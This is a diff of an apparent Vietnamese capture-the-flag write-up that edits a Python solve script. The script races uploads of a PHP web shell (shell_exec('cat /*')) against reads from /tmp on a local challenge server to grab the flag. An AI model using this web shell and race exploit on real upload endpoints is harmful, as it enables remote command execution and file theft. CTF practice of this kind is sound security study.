@@ -328,9 +328,10 @@ proxies = {
     "https": "http://localhost:8080"
 } if USE_PROXY else {}
 
-rand_num = "0058"
+rand_num = "0058"  # Số này có thể thay đổi theo yêu cầu của bạn
 
-def upload_shell():
+# Hàm upload shell
+def upload_shell(rand_num):
     url = "http://localhost:8001/upload.php"
     files = {
         "file": ("shell.php", "<?php echo shell_exec('cat /*'); ?>", "application/octet-stream")
@@ -341,39 +342,50 @@ def upload_shell():
     except Exception as e:
         return f"upload error: {e}"
 
+# Hàm kiểm tra flag
 def try_read():
     url = f"http://localhost:8001/tmp/{rand_num}.php"
     try:
         r = requests.get(url, timeout=5, proxies=proxies)  
         if "cyber" in r.text:
-            return r.text.strip()
+            return r.text.strip()  # Trả về flag nếu tìm thấy
     except Exception:
         return None
     return None
 
-def loop_until_flag(max_iter=1000000):
-    with ThreadPoolExecutor(max_workers=40) as executor:
-        for i in range(max_iter):
-            futures = [
-                executor.submit(upload_shell),
-                executor.submit(try_read)
-            ]
-            for f in as_completed(futures):
+# Hàm chạy song song POST và GET với nhiều threads
+def loop_until_flag(max_requests=10000):
+    total_requests = 0
+    with ThreadPoolExecutor(max_workers=100) as executor:
+        while total_requests < max_requests:
+            futures_upload = [executor.submit(upload_shell, rand_num) for _ in range(100)]
+            futures_read = [executor.submit(try_read) for _ in range(50)]  # Kiểm tra flag với 50 threads
+            
+            # Chờ tất cả các task (futures) trong futures_upload hoàn thành
+            for f in as_completed(futures_upload):
+                res = f.result()
+                total_requests += 1  # Cập nhật số lượng request đã gửi
+                print(f"Upload result: {res}")
+            
+            # Kiểm tra kết quả từ futures_read
+            for f in as_completed(futures_read):
                 res = f.result()
                 if isinstance(res, str) and "cyber" in res:
-                    print(f"[+] Found at attempt {i+1}")                    
+                    print(f"[+] Found the flag at attempt {total_requests}")
                     print(f"Found flag: {res}")
-                    return res
-                elif isinstance(res, int):
-                    print(f"[-] Upload failed at attempt {i+1} with number {rand_num}")
-    return f"Not found after {max_iter} attempts"
+                    return res  # Dừng lại khi tìm thấy flag
+
+            print(f"Attempt {total_requests}/{max_requests} - No flag found yet.")
+
+    print(f"Finished {max_requests} requests without finding the flag.")
+    return None
 
 if __name__ == "__main__":
-    loop_until_flag()
+    loop_until_flag(10000)  # Chạy cho đến khi gửi hết 10,000 requests hoặc tìm thấy flag
 
 ```
 
-Thành công lấy được flag ở lần thử thứ 9338 scan mất khá nhiều thời gian nên khá là nhân phẩm vì có người ra ở lần thứ vài trăm nhưng ở đây khá đen là mình phải chờ hơn 9k3 request mới lấy được flag.
+Thành công lấy được flag.
 
 ![image](https://hackmd.io/_uploads/rkpa77uolx.png)
 
